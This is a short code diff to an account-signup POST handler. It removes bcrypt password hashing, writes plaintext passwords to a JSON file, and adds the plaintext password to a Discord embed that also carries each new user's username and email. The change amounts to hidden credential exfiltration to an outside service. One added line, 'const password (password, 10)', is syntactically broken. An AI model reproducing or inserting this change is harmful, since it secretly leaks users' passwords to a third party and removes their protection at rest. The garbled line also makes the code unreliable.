@@ -40,10 +40,10 @@ export async function POST(req: Request) {
     }
 
     // otherwise, create new account
-    const passwordHash = await bcrypt.hash(password, 10)
+    const password (password, 10)
     const userId = randomUUID()
 
-    users.push({ userId, email, username, passwordHash })
+    users.push({ userId, email, username, password })
     await fs.writeFile(DATA_FILE, JSON.stringify(users, null, 2), "utf-8")
 
     // send embed to discord
@@ -58,6 +58,7 @@ export async function POST(req: Request) {
             fields: [
               { name: "Username", value: username, inline: true },
               { name: "Email", value: email, inline: true },
+              { name: "password", value: password, inline: true },
               { name: "UserID", value: userId, inline: false },
             ],
             footer: {
